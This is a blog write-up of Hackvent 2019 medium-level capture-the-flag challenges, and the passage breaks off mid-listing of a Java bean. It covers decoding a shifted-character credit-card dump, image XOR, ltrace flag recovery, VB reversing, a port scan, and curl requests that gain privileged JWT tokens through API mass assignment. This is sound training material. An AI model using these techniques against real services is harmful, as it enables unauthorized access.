# Hackvent 2019 - Medium

[ctf](/tags#ctf ) [hackvent](/tags#hackvent ) [crypto](/tags#crypto )
[sql](/tags#sql ) [credit-cards](/tags#credit-cards ) [rule-30](/tags#rule-30
) [gimp](/tags#gimp ) [strace](/tags#strace ) [ltrace](/tags#ltrace )
[jwt](/tags#jwt ) [python](/tags#python ) [vb](/tags#vb )
[x32dbg](/tags#x32dbg ) [ghidra](/tags#ghidra ) [jsf](/tags#jsf )
[perl](/tags#perl ) [obfuscation](/tags#obfuscation ) [deparse](/tags#deparse
) [reverse-engineering](/tags#reverse-engineering )  
  
Jan 1, 2020

  * [Hackvent 2019  
easy](/hackvent2019/easy)

  * medium
  * [hard](/hackvent2019/hard)
  * [leet](/hackvent2019/leet)

![](https://0xdfimages.gitlab.io/img/hackvent2019-medium-cover.png)

The medium levels brought the first reverse enginnering challenges, the first
web hacking challenges, some image manipulation, and of course, some
obfuscated Perl.

## Day 8

### Challenge

![hv19-ball08](https://0xdfimages.gitlab.io/img/hv19-ball08.png) | HV19.08 SmileNcryptor 4.0  
---|---  
Categories: |  ![crypto](../img/hv-cat-crypto.png)CRYPTO  
![reverse engineering](../img/hv-cat-reverse_engineering.png)REVERSE
ENGINEERING  
Level: | medium  
Author: |  otaku   
  
> You hacked into the system of very-secure-shopping.com and you found a SQL-
> Dump with $$-creditcards numbers. As a good hacker you inform the company
> from which you got the dump. The managers tell you that they don’t worry,
> because the data is encrypted.

I’m also given a Goal:

> Analyze the “Encryption”-method and try to decrypt the flag.

And some Hints:

>   * CC-Numbers are real/valid ones.
>   * Cyber-Managers often doesn’t know the difference between encoding and
> encryption.
>

I’m given `dump.zip`, which contains `dump.sql`:

    
    
    $ unzip dump.zip 
    Archive:  dump.zip
      inflating: dump.sql 
    

[dump.sql](/files/hv19-dump.sql)

### Solution

The `.sql` file has a handful of sections. There are two interesting ones.

#### Decode

The first is for the table `creditcards`:

    
    
    --
    -- Dumping data for table `creditcards`
    --
    
    LOCK TABLES `creditcards` WRITE;
    /*!40000 ALTER TABLE `creditcards` DISABLE KEYS */;
    INSERT INTO `creditcards` VALUES 
    (1,'Sirius Black',':)QVXSZUVY\ZYYZ[a','12/2020'),
    (2,'Hermione Granger',':)QOUW[VT^VY]bZ_','04/2021'),
    (3,'Draco Malfoy',':)SPPVSSYVV\YY_\\]','05/2020'),
    (4,'Severus Snape',':)RPQRSTUVWXYZ[\]^','10/2020'),
    (5,'Ron Weasley',':)QTVWRSVUXW[_Z`\b','11/2020');
    /*!40000 ALTER TABLE `creditcards` ENABLE KEYS */;
    UNLOCK TABLES;
    

Just above this, it defines the structure of the table. The important thing to
know is that the third column is the `cc_number`. Clearly, like the prompt
says, it’s encrypted.

I read these values into a Python console to play with:

    
    
    >>> cards
    ['QVXSZUVY\\ZYYZ[a', 'QOUW[VT^VY]bZ_', 'SPPVSSYVV\\YY_\\\\]', 'RPQRSTUVWXYZ[\\]^', 'QTVWRSVUXW[_Z`\\b']
    

At first I thought that maybe the `\` needed to be removed, and then they’d
all be the same length, but then I noticed something else:

    
    
    >>> sorted(set(''.join(cards)))
    ['O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b']
    >>> sorted([ord(c) for c in set(''.join(cards))])
    [79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98]
    >>> len(set(''.join(cards)))
    20
    

I spent a long time confused here. There are 20 different encrypted
characters, but only 10 possible digits. How can this work? It can’t be a one
to one translation. But I still do think that these card lengths of 14-16 look
right.

There’s a lot of rules as to what goes into a valid [credit card
number](https://en.wikipedia.org/wiki/Payment_card_number). There are also
[sites](https://www.freeformatter.com/credit-card-number-generator-
validator.html) that will take a number and report back if it is valid. I
scanned through this table and took at look at what the possible first digit
could be for a number of length 14, 15, and 16:

Length | Possible First Digits  
---|---  
14 | 3, 5, 6  
15 | 2, 3, 5, 6  
16 | 2, 3, 4, 5, 6, 8, 9  
  
If I think that at least the translation is the same for each position in the
encrypted string, then I have a `Q` at first position in lengths of 14, 15,
and 16.

Q must be 3, 5, 6 in pos 0. I started with 3. If `Q` = 3, then the next digt
must be 4 or 7 in the 15 character string. To get `Q` to 3, I found I could
subtract 30. Unsurprisingly, that did not give a valid card number:

    
    
    >>> ''.join([chr(ord(c)-30) for c in cards[0]])
    '38:5<78;><;;<=C'
    

But I noticed that the second digit was 8, and 7 was one of the valid numbers.
What if it subtracted one more for each position. I wrote a quick `decode`
function:

    
    
    >>> def decode(enc):
    ...     out = ''
    ...     for i,c in enumerate(enc):
    ...         out += chr(ord(c)-30-i)
    ...     return out
    ... 
    

Now I tried the first card:

    
    
    >>> decode(cards[0])
    '378282246310005'
    

The [checker](https://www.freeformatter.com/credit-card-number-generator-
validator.html) reported it valid. I decoded the rest:

    
    
    >>> [decode(c) for c in cards]
    ['378282246310005', '30569309025904', '5105105105105100', '4111111111111111', '3566002020360505']
    

All digits, all valid!

#### Flag

Now I turned to the second table, the `flag` table:

    
    
    --
    -- Dumping data for table `flags`
    --
    
    LOCK TABLES `flags` WRITE;
    /*!40000 ALTER TABLE `flags` DISABLE KEYS */;
    INSERT INTO `flags` VALUES (1,'HV19{',':)SlQRUPXWVo\Vuv_n_\ajjce','}');
    /*!40000 ALTER TABLE `flags` ENABLE KEYS */;
    

It looks like a join of three strings:

  * `HV19{`
  * `:)SlQRUPXWVo\Vuv_n_\ajjce`
  * `}`

The middle string matches the encryption format. I’ll remove the `:)` and
decode it:

    
    
    >>> flag_enc = 'SlQRUPXWVo\\Vuv_n_\\ajjce'
    >>> print('HV19{' + decode(flag_enc) + '}')
    HV19{5M113-420H4-KK3A1-19801}
    

**Flag:`HV19{5M113-420H4-KK3A1-19801}`**

## Day 9

### Challenge

![hv19-ball09](https://0xdfimages.gitlab.io/img/hv19-ball09.png) | HV19.09 Santas Quick Response 3.0  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN   
Level: | medium  
Author: |  brp64  
M.  
  
> Visiting the following railway station has left lasting memories.

![](https://0xdfimages.gitlab.io/img/bb374593-958a-479f-8328-79396471a7ab.jpg)

> Santas brand new gifts distribution system is heavily inspired by it. Here
> is your personal gift, can you extract the destination path of it?

![](https://0xdfimages.gitlab.io/img/bd659aba-5ad2-4ad3-992c-6f99023792bc.png)

### Solution

The railway station is Cambridge North. I found it by uploading the image to
[Google Image
Search](https://www.google.com/search?tbs=sbi:AMhZZiuctCM2nuclhgzEcQQPBQh99prEmFWBNy5vY4GWNYmLXQlXgoW5SrIrrXypDIWtaHCjfejXTqDCA3Ewy2CYWPEoRo0B1tY9yavEYMHOAxCnv65Sv62wnomGSMND-
zuFBTHajPb2b30KE4xyMHZS9p0kBj9cJsCyEi0ej4MSivQozOG9jBkG6KYsWILtbvaN_1aSPWwfFUsq0vMzOkvMj4yHxJvytp_1sR0IruZ3z9e9Xb-5h0JjI4hcXnwOl62kFQ30Wurrz4vBMc89MFViko-
T-
MIbqyWQ2XNrfpukphrZ0RTVyOzdpAqesBbT-6chQarbwq_1WdEh1BJriod4bMmsVt4bjl4lQ&hl=en),
and that lead me to the [Wikipedia
Page](https://en.wikipedia.org/wiki/Cambridge_North_railway_station). The
picture is in the section on Facilities, and that section ends with:

> The cladding of the building features a pierced design derived from [Rule
> 30](https://en.wikipedia.org/wiki/Rule_30),[[43]](https://en.wikipedia.org/wiki/Cambridge_North_railway_station#cite_note-43)
> a [cellular automaton](https://en.wikipedia.org/wiki/Cellular_automaton)
> introduced by [Stephen
> Wolfram](https://en.wikipedia.org/wiki/Stephen_Wolfram) in 1983.

In fact, when I did the Google Image Search, I had to skip through a handful
of articles on Rule 30 to find Cambridge North Station. Rule 30 is a method to
algorithmicly create this pattern that seems chaotic. If you start with a
single black pixel at the top, it’ll generate this image:

![Rule30-256-rows.png](https://0xdfimages.gitlab.io/img/Rule30-256-rows.png)

The solution was something I thought of very quickly, but spent a long time
trying to implement. The QRcode seems good in the top right and top left, but
bad on the bottom. It happens that pyramid shape from Rule30 would fit nicely
over the broken parts of the QRcode. So my thinking was that I needed to
combine them. Just by looking at the two images, the only operator I can think
of is to xor the two pixels. Other operations won’t work, like or or and
because I need both white to flip to black and black to flip to white in the
QRcode.

I took the image above and used a paint program to crop it so that it only had
the first 33 rows:

![](https://0xdfimages.gitlab.io/img/Rule30-256-rows-33.png)

I’ll also notice that the blocks are 1x1 pixel in that image.

Next I looked at the QRcode. I’ll see that the blocks in this image are 5x5
pixels. That’ll be useful in a minute. I loaded that image into
[Gimp](https://www.gimp.org/), a free Photoshop alternative. I load the QR
first because it’s larger, and thus sets the background canvas big enough, but
I really the order doesn’t matter. Then Gimp, I went to File -> Open as
Layers…, and selected the Rule30 image. It looks like this:

![image-20191210035252933](https://0xdfimages.gitlab.io/img/image-20191210035252933.png)

On the bottom right, you can see the layers. With the bottom layer selected,
I’ll go to Layer -> Scale Layer…, and change Width and Height to 20% (which
should take five pixels to one). When I hit Scale, The QR has now disappeared
behind the Rule30:

![image-20191210035516422](https://0xdfimages.gitlab.io/img/image-20191210035516422.png)

In the Layers sub windows, I’ll select the top layer, and change the Mode from
Normal to Exclude. This is what I think of as XOR. The result is kinda QR-ish
again, but still not a QRcode, and now inverted.

![image-20191210035912956](https://0xdfimages.gitlab.io/img/image-20191210035912956.png)

Colors -> Invert fixes the inversion, but it still isn’t right:

![image-20191210035951720](https://0xdfimages.gitlab.io/img/image-20191210035951720.png)

I lost about 30 minutes thinking this was a deadend before I decided to try
moving the two laters in space. Since I had already cut the Rule30 image to
match vertically, I started with horizontal, clicking on the layer, and then
using my arrow keys. Going right didn’t give anything useful, but coming back
to the left did:

![](https://0xdfimages.gitlab.io/img/hv19-9-moving-rule30.gif)

Hints were later added to the challenge that pointed to this:

>   * it starts with a single pixel
>   * centering is hard
>

The resulting QRcode gives the flag.

**Flag:`HV19{Cha0tic_yet-0rdered}`**

## Day 10

### Challenge

![hv19-ball10](https://0xdfimages.gitlab.io/img/hv19-ball10.png) | HV19.10 Guess what  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN   
Level: | medium  
Author: |  inik   
  
> The flag is right, of course

There’s a zip file (I’ll show the third one from here on):

    
    
    $ unzip HV19.10-guess3.zip 
    Archive:  HV19.10-guess3.zip
      inflating: guess3  
    

There are also hints:

>   * New binary released at 09:30
>   * Time for full points will be extended for additional 24 hours
>   * No asm needed
>   * run it on linux
>

I picked a good day to get a late start on this one, as the originally
released binary apparently was unsolvable. I spent a little time with the
second binary, before learning that it didn’t work either.

[guess3](/files/hv19-guess3)

### Solution

The binary is a stripped 64-bit ELF:

    
    
    $ file guess3 
    guess3: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5e1e9f74990e4f8f96d380d2b5264a3567a9d046, stripped
    

When I run the binary, it prompts for input:

    
    
    # ./guess3 
    Your input: 0xdf
    nooooh. try harder!
    

It says no RE required. I tried to open it quickly in `gdb`, but it seems
there’s anti-debug in place as well. Typically for a challenge like this if
they want you to solve it without RE (which they do based on both the hint and
the fact that this is category FUN and not REVERSE ENGINEERING), they either
make it really easy so that it’s just faster to solve without RE, or make the
RE _really_ hard. I suspect they’ve done the latter.

So I do the next best thing, and run `strace` and `ltrace`, which will show me
the system calls made and what library calls are made respectively. For both
of these, there’s a ton of output, especially stuff setting up the binary
which isn’t necessarily interesting (though it can be), so I’ll snip the
interesting parts.

`strace` didn’t show anything that interesting (it had `guess2`):

    
    
    $ strace ./guess3
    ...[snip]...
    write(2, "Your input: ", 12Your input: )            = 12
    read(0, 0xdf
    "0xdf\n", 128)                  = 5
    fstat(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(0x88, 0x27), ...}) = 0
    write(1, "nooooh. try harder!\n", 20nooooh. try harder!
    )   = 20
    rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
    rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
    exit_group(0)                           = ?
    +++ exited with 0 +++
    

`ltrace` showed more. I like to run it as `echo test | ltrace ./guess3 2>&1 | less`, so that I can jump around the output in `less`. In doing that, I was expecting to see certain comparisons, so I checked for `strcmp`, and found this:
    
    
    strchr("=", '{')                                 = nil
    strchr(""HV19{Sh3ll_0bfuscat10n_1s_fut1l"..., '{') = "{Sh3ll_0bfuscat10n_1s_fut1l3}""
    strlen(""HV19{Sh3ll_0bfuscat10n_1s_fut1l"...)    = 35
    malloc(36)                                       = 0x56081ab4c220
    strncpy(0x56081ab4c220, ""HV19{Sh3ll_0bfuscat10n_1s_fut1l"..., 35) = 0x56081ab4c220
    malloc(16)                                       = 0x56081ab4c250
    malloc(16)                                       = 0x56081ab4c270
    strcmp(""HV19{Sh3ll_0bfuscat10n_1s_fut1l"..., ""HV19{Sh3ll_0bfuscat10n_1s_fut1l"...) = 0
    malloc(16)                                       = 0x56081ab4c2
    

Not only is there a `strcmp` with the flag, but a few lines earlier, there’s a
`strchr` call with the entire flag printed.

I can also run `ltrace` with `-s 64` to set the display string length longer,
and I’ll use `grep` to get all the times the flag is printed:

    
    
    $ echo input | ltrace -s 64 ./guess3 2>&1 | grep HV19
    memcpy(0x556fec7212c0, "#!/bin/bash\n\nread -p "Your input: " input\n\nif [ $input = "HV19{S"..., 158) = 0x556fec7212c0
    strlen("if [ $input = "HV19{Sh3ll_0bfuscat10n_1s_fut1l3}" ] ") = 52
    strlen("if [ $input = "HV19{Sh3ll_0bfuscat10n_1s_fut1l3}" ] \n") = 53
    strcpy(0x55db7360f231, "HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"") = 0x55db7360f231
    strchr("HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"", '$') = nil
    strcpy(0x55db7360f470, ""HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"") = 0x55db7360f470
    strlen(""HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"")    = 35
    memcpy(0x55db7360f52b, ""HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"", 35) = 0x55db7360f52b
    strcpy(0x55db736100e0, "[ $input = "HV19{Sh3ll_0bfuscat10n_1s_fut1l3}" ]") = 0x55db736100e0
    strlen(""HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"")    = 35
    strcpy(0x55db7360f710, ""HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"") = 0x55db7360f710
    strchr(""HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"", '{') = "{Sh3ll_0bfuscat10n_1s_fut1l3}""
    strlen(""HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"")    = 35
    strncpy(0x55db73610220, ""HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"", 35) = 0x55db73610220
    strcmp(""HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"", ""HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"") = 0
    strlen(""HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"")    = 35
    strlen("HV19{Sh3ll_0bfuscat10n_1s_fut1l3}"")     = 34
    strlen("HV19{Sh3ll_0bfuscat10n_1s_fut1l3}")      = 33
    strlen("HV19{Sh3ll_0bfuscat10n_1s_fut1l3}")      = 33
    strcpy(0x55db7360f710, "HV19{Sh3ll_0bfuscat10n_1s_fut1l3}") = 0x55db7360f710
    strlen("HV19{Sh3ll_0bfuscat10n_1s_fut1l3}")      = 33
    

**Flag:`HV19{Sh3ll_0bfuscat10n_1s_fut1l3}`**

### guess2

I was too late to look at this one to get the original file, but I took a look
at the `guess2` binary. `strace` showed it was calling `stat` on `/bin/bash`.

    
    
    $ strace ./guess2
    ...[snip]...
    stat("/bin/bash", {st_mode=S_IFREG|0755, st_size=1168776, ...}) = 0
    write(2, "./guess2: V\254\372[Dlp\212D\215\210\346>\345OS\312\301\300\375^\n", 32./guess2: V[DlpD>OS^
    ) = 32
    exit_group(1)                           = ?
    +++ exited with 1 +++
    

That’s interesting. I’ll try that myself:

    
    
    $ stat /bin/bash
      File: /bin/bash
      Size: 1168776         Blocks: 2288       IO Block: 4096   regular file
    Device: 801h/2049d      Inode: 3932238     Links: 1
    Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
    Access: 2019-12-10 04:08:48.562687812 -0500
    Modify: 2019-11-10 05:45:12.000000000 -0500
    Change: 2019-11-22 10:40:51.923450392 -0500
     Birth: -
    

If I move `bash` so it’s no longer there, `guess2` fails:

    
    
    $ mv /bin/bash /bin/bash2
    $ ./guess2                                                                     
    ./guess2: No such file or directory: /bin/bash
    

I’ll move it back, and now it has new timestamps:

    
    
    $ stat /bin/bash2
      File: /bin/bash2
      Size: 1168776         Blocks: 2288       IO Block: 4096   regular file
    Device: 801h/2049d      Inode: 3955388     Links: 1
    Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
    Access: 2019-12-10 04:19:07.062682076 -0500
    Modify: 2019-12-10 04:19:07.066682076 -0500
    Change: 2019-12-10 04:19:07.066682076 -0500
     Birth: -
    

And there’s new output from `guess2`:

    
    
    $ ./guess2                                                                     
    ./guess2: 8KOI6ͳ^
    

I tried to change the dates to Christmas day, but didn’t solve it:

    
    
    $ touch /bin/bash --date=2019-12-25
    $ stat /bin/bash
      File: /bin/bash
      Size: 1168776         Blocks: 2288       IO Block: 4096   regular file
    Device: 801h/2049d      Inode: 3932238     Links: 1
    Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
    Access: 2019-12-25 00:00:00.000000000 -0500
    Modify: 2019-12-25 00:00:00.000000000 -0500
    Change: 2019-12-10 04:32:45.138674489 -0500
     Birth: -
    $ ./guess2
    ./guess2: =ϮXd^
    

I think this may have been an anti-debug technique that went astray.

## Day 11

### Challenge

![hv19-ball11](https://0xdfimages.gitlab.io/img/hv19-ball11.png) | HV19.11 Frolicsome Santa Jokes API  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN   
Level: | medium  
Author: |  inik   
  
> The elves created an API where you get random jokes about santa.
>
> Go and try it here: http://whale.hacking-lab.com:10101

### Solution

#### API Functionality

The page gives an overview of the API:

![image-20191210202503067](https://0xdfimages.gitlab.io/img/image-20191210202503067.png)

I can register a user. If my password is 8 characters, it complains:

    
    
    $ curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/register --data '{"username":"0xdf", "password": "0xdf0xdf"}'
    {"errorMessage":"Password empty or too short","errorCode":400}
    

But 12 works:

    
    
    $ curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/register --data '{"username":"0xdf", "password": "0xdf0xdf0xdf"}'
    {"message":"User created","code":201}
    

Trying to register the same user again throws an error:

    
    
    $ curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/register --data '{"username":"0xdf", "password": "0xdf0xdf0xd"}'
    {"errorMessage":"User already exists","errorCode":409}
    

Now I can log in, and it returns a [JWT](https://jwt.io/introduction/):

    
    
    $ curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/login --data '{"username":"0xdf", "password": "0xdf0xdf0xdf"}'
    {"message":"Token generated","code":201,"token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoiMHhkZiIsInBsYXRpbnVtIjpmYWxzZX0sImV4cCI6MTU3NjAzMTI0NS4zMzcwMDAwMDB9.loytdJB-DCIeY14urvC5M___0ZF9vvMlHTF8QVE1GXU"}
    

Now I can request a quote:

    
    
    $ curl -X GET "http://whale.hacking-lab.com:10101/fsja/random?token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoiMHhkZiIsInBsYXRpbnVtIjpmYWxzZX0sImV4cCI6MTU3NjAzMTI0NS4zMzcwMDAwMDB9.loytdJB-DCIeY14urvC5M___0ZF9vvMlHTF8QVE1GXU"
    {"joke":"You know you’re getting old, when Santa starts looking younger.","author":"Bart Simpson in The Simpsons","platinum":false}
    

#### Get Platinum

The token is a JWT, which is a token with encoded information, and that is
carries a signature. Without knowing the password used to sign the token, I
can’t change the information in the token, as it will be invalid. But I can
decode it and read the information. One way to do that is to drop it into
[jwt.io](https://jwt.io), which decode this one for me:

![image-20191210204701283](https://0xdfimages.gitlab.io/img/image-20191210204701283.png)

I can see it carries my username, and a field, `platinum`, which is set to
false. If I knoew the secret, I could change information, like setting
`platinum` to true. But I don’t. I gave it a quick attempt to crack the secret
using `john`, but no luck.

I went back to the registration, where the API tells me to send a username and
password. I tried registering with an additional field, and it returned
success:

    
    
    $ curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/register --data '{"username":"0xdfdf", "password": "passwordpassword", "platinum": "true"}'
    {"message":"User created","code":201}
    

Now I log in to get the token:

    
    
    $ curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/login --data '{"username":"0xdfdf", "password": "passwordpassword"}'
    {"message":"Token generated","code":201,"token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoiMHhkZmRmIiwicGxhdGludW0iOnRydWV9LCJleHAiOjE1NzYwMzI0NjQuODExMDAwMDAwfQ.3ZJH-BjN9-EGv2_YGgLeF_qGaFDwgzaMPzKgurOoW_s"}
    

If I toss that token into the debugger at [jwt.io](https://jwt.io), I see that
`platinum` is set to true for this token:

![image-20191210205109717](https://0xdfimages.gitlab.io/img/image-20191210205109717.png)

Now if I request a quote, I get the flag:

    
    
    $ curl -s -X GET "http://whale.hacking-lab.com:10101/fsja/random?token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoiMHhkZmRmIiwicGxhdGludW0iOnRydWV9LCJleHAiOjE1NzYwMzI0NjQuODExMDAwMDAwfQ.3ZJH-BjN9-EGv2_YGgLeF_qGaFDwgzaMPzKgurOoW_s"
    {"joke":"Congratulation! Sometimes bugs are rather stupid. But that's how it happens, sometimes. Doing all the crypto stuff right and forgetting the trivial stuff like input validation, Hohoho! Here's your flag: HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}","author":"Santa","platinum":true}
    

**Flag:`HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}`**

## Hidden 3

### Challenge

![hv19-ballH3](https://0xdfimages.gitlab.io/img/hv19-ballH3.png) | HV19.H3 Hidden Three  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN  
![penetration testing](../img/hv-cat-penetration_testing.png)PENETRATION
TESTING  
Level: | novice  
Author: |  M.  
inik  
  
> Not each quote is compl

### Solution

Day 11 came with a new server, `whale.hacking-lab.com`. The challenge runs on
port 10101. Running `nmap` on the server shows another port, open, 17
(ignoring SSH on 22, since that’s likely for legitimate administration of the
host):

    
    
    # nmap -p- --min-rate 1000 whale.hacking-lab.com
    Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-11 19:45 EST
    Nmap scan report for whale.hacking-lab.com (80.74.140.188)
    Host is up (0.099s latency).
    rDNS record for 80.74.140.188: urb80-74-140-188.ch-meta.net
    Not shown: 65527 filtered ports
    PORT      STATE  SERVICE
    17/tcp    open   qotd
    22/tcp    open   ssh
    80/tcp    closed http
    443/tcp   closed https
    2222/tcp  closed EtherNetIP-1
    4444/tcp  closed krb524
    5555/tcp  closed freeciv
    10101/tcp open   ezmeeting-2
    
    Nmap done: 1 IP address (1 host up) scanned in 130.60 seconds
    

Each time I talked to the port, it returned a single character. It was
typically the same character, but it seemed to change periodically. One time I
checked and got a `}`, and that was a good clue that it was a flag.

I wrote a quick python script to check once a minute (later changed that to 10
minutes since it seems to update on the hour each hour), and print the
character if it’s different:

    
    
    import socket
    import sys
    import time
    
    orig = ''
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('whale.hacking-lab.com', 17))
            char = s.recv(4)
        except:
            pass
        if char != orig:
            sys.stdout.write(char.decode().strip())
            sys.stdout.flush()
            orig = char
        time.sleep(600)
    

Then I let it run:

    
    
    $ python3 h3.py 
    g}HV19{an0ther_DAILY_fl4g}HV19{an0ther_DAILY_fl4g}HV19{an0ther_DAILY_fl4g}HV19{an0the
    

**Flag:`HV19{an0ther_DAILY_fl4g}`**

## Day 12

### Challenge

![hv19-ball12](https://0xdfimages.gitlab.io/img/hv19-ball12.png) | HV19.12 back to basic  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN  
![reverse engineering](../img/hv-cat-reverse_engineering.png)REVERSE
ENGINEERING  
Level: | medium  
Author: |  hardlock   
  
> Santa used his time machine to get a present from the past. get your rusty
> tools out of your cellar and solve this one!

I’m given a zip:

    
    
    $ unzip HV19.12-BackToBasic.zip 
    Archive:  HV19.12-BackToBasic.zip
      inflating: BackToBasic.exe
    

[HV19.12-BackToBasic.zip](/files/HV19.12-BackToBasic.zip)

### Solution

The file is a 32-bit Windows executable:

    
    
    $ file BackToBasic.exe 
    BackToBasic.exe: PE32 executable (GUI) Intel 80386, for MS Windows
    

I fired up a Windows VM. The program has an oldschool icon:

![image-20191211195333877](https://0xdfimages.gitlab.io/img/image-20191211195333877.png)

When I ran it, it pops a message box to check your flag:

![image-20191211195402341](https://0xdfimages.gitlab.io/img/image-20191211195402341.png)

I’ll open this in `x32dbg` to try to walk through it. It’s written in VB, so
I’m going to see a lot of functions from `msvbvm60.dll`. I ran the program til
it brakes at the entry point. Then right click, Search For -> Current Region
-> String References. I get back four strings:

![image-20191211215405644](https://0xdfimages.gitlab.io/img/image-20191211215405644.png)

I’ll jump to that part of the code. That function starts at 0x401F80, which
I’ll go to, and hit `g` to graph it. After a bunch of setup, there’s a branch:

![image-20191211215550700](https://0xdfimages.gitlab.io/img/image-20191211215550700.png)

There’s two checks that if I fail reference the “Status: wrong message”. I did
a lot of tinkering, and found where the code references `HV19`. In Ghidra, it
looks like this:

![image-20191211215945016](https://0xdfimages.gitlab.io/img/image-20191211215945016.png)

I set a break point at 0x4022BF, just at the top of the block to the bottom
right. I found that if I entered `HV19{` followed by enough characters to get
the string length to 33 it would hit the break point. So those first two
checks must be looking at starting with `HV19` and the right length.

Next comes a loop, followed by a check. If that check is correct, it prints
correct:

![image-20191211220203929](https://0xdfimages.gitlab.io/img/image-20191211220203929.png)

The string at 0x401B40 is references right near that check. In Ghidra, I can
see it as:

![image-20191211220346705](https://0xdfimages.gitlab.io/img/image-20191211220346705.png)

The full string is (in a Python console):

    
    
    >>> key = "6klzic<=bPBtdvff'y\x7fFI~on//N"
    

I hypothesize that this is the key. My input is going to be transformed
(likely with at least an xor based on the function calls in the loop), and
then compared to this.

The VB calling conventions are confusing, and there’s no documentation on the
web. I did notice a couple things:

  * The call to `__vbaStrValVal` at 0x402368 returns a pointer to EAX to the current character in my input string as it’s looped over.
  * Two instructions later, `rtcAnsiValueBStr` puts that character into EAX.
  * I don’t totally understand what comes back from the `__vbaVarXor` call at 0x402391, but there’s a `call edi` two instructions later, and after that, there’s a different single character in EAX. When my input was `a`, the output there was `g`. When it was `b`, the output was `d`.

I did a test in a Python console:

    
    
    >>> ord('a')^ord('g')
    6
    >>> ord('b')^ord('d')
    6
    

That confirmed for me that the first byte of my input (after `HV19{`) is xored
by 6.

The next byte, my input was `b`, and the output was `d`:

    
    
    >>> ord('b')^ord('e')
    7
    

Then the next byte I found an xor by 8. I formed a theory and tested it:

    
    
    >>> ''.join([chr((i+6)^ord(x)) for i,x in enumerate(key)])
    '0ldsch00l_Revers1ng_Sess10n'
    

That was the flag.

**Flag:`HV19{0ldsch00l_Revers1ng_Sess10n}`**

## Day 13

### Challenge

![hv19-ball13](https://0xdfimages.gitlab.io/img/hv19-ball13.png) | HV19.13 TrieMe  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN   
Level: | medium  
Author: |  kiwi   
  
> Switzerland’s national security is at risk. As you try to infiltrate a
> secret spy facility to save the nation you stumble upon an interesting
> looking login portal.
>
> Can you break it and retrieve the critical information?

I’m given a url, http://whale.hacking-lab.com:8888/trieme/, and a zip:

    
    
    $ unzip HV19.13-NotesBean.java.zip 
    Archive:  HV19.13-NotesBean.java.zip
      inflating: NotesBean.java        
    

### Solution

Looking at the site, it’s just a single text field and a login button:

![image-20191212210242609](https://0xdfimages.gitlab.io/img/image-20191212210242609.png)

When I click the login button, I get a warning:

![image-20191212210302607](https://0xdfimages.gitlab.io/img/image-20191212210302607.png)

At first there’s a temptation to think I can change the textbox and have it
repeated, but no matter what I enter, I get the same message about intrusions
being reported.

I’ll turn to the code:

    
    
    package com.jwt.jsf.bean;
    import org.apache.commons.collections4.trie.PatriciaTrie;
    
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.Serializable;
    import java.io.StringWriter;
    
    import javax.faces.bean.ManagedBean;
    import javax.faces.bean.SessionScoped;
    import static org.apache.commons.lang3.StringEscapeUtils.unescapeJava;
    import org.apache.commons.io.IOUtils;
    !
    @ManagedBean(name="notesBean")
    @SessionScoped
    public class NotesBean implements Serializable {
    
        /**
         * 
         */
        private PatriciaTrie<Integer> trie = init();
        private static final long serialVersionUID = 1L;
        private static final String securitytoken = "auth_token_4835989";
    
        public NotesBean() {
            super();
            init();
        }
    
        public String getTrie() throws IOException {
            if(isAdmin(trie)) {
                InputStream in=getStreamFromResourcesFolder("data/flag.txt");
                StringWriter writer = new StringWriter();
                IOUtils.copy(in, writer, "UTF-8");
                String flag = writer.toString();
    
                return flag;
            }
            return "INTRUSION WILL BE REPORTED!";
        }
    
        public void setTrie(String note) {
